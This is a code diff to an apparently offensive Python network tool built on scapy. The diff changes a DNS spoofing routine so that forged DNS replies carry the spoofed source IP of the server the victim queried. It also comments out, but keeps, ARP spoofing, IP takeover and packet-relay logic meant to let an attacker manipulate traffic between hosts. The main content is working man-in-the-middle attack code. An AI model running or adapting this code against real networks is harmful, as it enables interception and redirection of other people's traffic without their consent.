@@ -7,6 +7,7 @@ import socket
 from sqlite3 import Time
 from threading import Thread
 import threading
+from xml import dom
 import scapy.all as scapy
 import psutil
 import nmap
@@ -213,12 +214,12 @@ class NetFunctions():
         # Send the packet
         scapy.sendp(packet, iface=interface)
 
-    def send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface):
-        # Google’s IP address for the response
+    def send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, transaction_id, Interface):
+        # Google's IP address for the response
         URL_Destination = "142.250.217.68"  # Replace with any IP you want to use, like Google's
 
         # Craft the IP layer
-        ip = scapy.IP(src="8.8.8.8", dst=client_ip)  # Adjust source IP if needed
+        ip = scapy.IP(src=dest_ip, dst=client_ip)  # Adjust source IP if needed
     
         # Craft the UDP layer
         udp = scapy.UDP(sport=53, dport=client_port)
@@ -242,6 +243,8 @@ class NetFunctions():
     
         # Stack layers to form the final packet
         response_packet = ip / udp / dns
+
+        print(f"{client_ip},{domain}")
     
         # Send the packet
         scapy.send(response_packet, iface=Interface , verbose = False)
@@ -253,16 +256,16 @@ class NetFunctions():
             client_port = packet[scapy.UDP].sport
             domain = packet[scapy.DNSQR].qname.decode("utf-8")  # Decode bytes to string
             transaction_id = packet[scapy.DNS].id
+            dest_ip = packet[scapy.IP].dst  # IP the client sent the request to
         
             # Define the IP address to respond with
             ip_address = "8.8.8.8"  # Replace with desired IP
         
             # Call function to send DNS response
-            # NetFunctions.send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface)
-            NetFunctions.send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface)
+            NetFunctions.send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, transaction_id, Interface)
 
     def start_sniffing(ip_address, Interface):
-        NetFunctions.sniff(filter="udp port 53", 
+        scapy.sniff(filter="udp port 53", 
               prn=lambda packet: NetFunctions.dns_request_handler(packet, ip_address, Interface),
               iface="eth0")
 
@@ -297,7 +300,7 @@ def Main():
 
     host = ipaddress.IPv4Address(IP)
     net = ipaddress.IPv4Network(IP + '/' + MASK, False)
-    gw = scapy.conf.route.route("0.0.0.0")[2]
+    #gw = scapy.conf.route.route("0.0.0.0")[2]
 
     #starts new thread to run the function that gathers the Network traffic
     # t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
@@ -318,61 +321,63 @@ def Main():
     IfIPChange=False
 
     if Target in nm.all_hosts():
-        t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
-        t2.start()
+        # t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
+        # t2.start()
 
-        if(IfIPChange==False):
-            try:
-                t2.terminate()
-                NetFunctions.changeIPAddress(Interface, Target, MASK)
-                IfIPChange=True
+        # if(IfIPChange==False):
+        #     try:
+        #         t2.terminate()
+        #         NetFunctions.changeIPAddress(Interface, Target, MASK)
+        #         IfIPChange=True
 
-                print("IP Address successfully Changed")
+        #         print("IP Address successfully Changed")
 
-                t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
-                t1.start()
+        #         t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
+        #         t1.start()
 
-                t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
-                t2.start()
+        #         t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
+        #         t2.start()
 
-            except:
-                IfIPChange=False
+        #     except:
+        #         IfIPChange=False
+
+        
 
         while 1:
+            NetFunctions.start_sniffing("8.8.8.8", Interface)
             try:
                 packetCapturedGroup = scapy.sniff(iface=NetFunctions.get_interface_from_ip(IP), count=5) #Captures Packets
 
-                for packetCaptured in packetCapturedGroup:
-                    if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
-                        NetFunctions.start_sniffing("8.8.8.8", Interface)
+                #for packetCaptured in packetCapturedGroup:
+                    #if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
+                        # if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
+                        #     packet = packetCaptured.copy()
 
-                        if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
-                            packet = packetCaptured.copy()
+                        #     packet.pdst = Target
+                        #     packet.dst = TargetMac
 
-                            packet.pdst = Target
-                            packet.dst = TargetMac
+                        #     scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
+                        # if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
+                        #     packet = packetCaptured.copy()
 
-                            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
-                        if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
-                            packet = packetCaptured.copy()
+                        #     packet.pdst = IP
+                        #     packet.dst = Mac
 
-                            packet.pdst = IP
-                            packet.dst = Mac
-
-                            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 
+                        #     scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 
 
             except KeyboardInterrupt: #closes on keyboard interupt
+                print("Keyboard Interupt")
                 NetFunctions.restore(Target, IP)
                 NetFunctions.changeIPAddress(Interface, IP, MASK)
-                t2.join()
-                t1.join()
+                # t2.join()
+                # t1.join()
                 sys.exit()
             except Exception as e: #closes on exception
                 print(f"Arp spoofing failed: {e}")
                 NetFunctions.restore(Target, IP)
                 NetFunctions.changeIPAddress(Interface, IP, MASK)
-                t2.join()
-                t1.join()
+                # t2.join()
+                # t1.join()
                 sys.exit()
 
 if __name__ == "__main__": #runs main program and checks for admin privileges
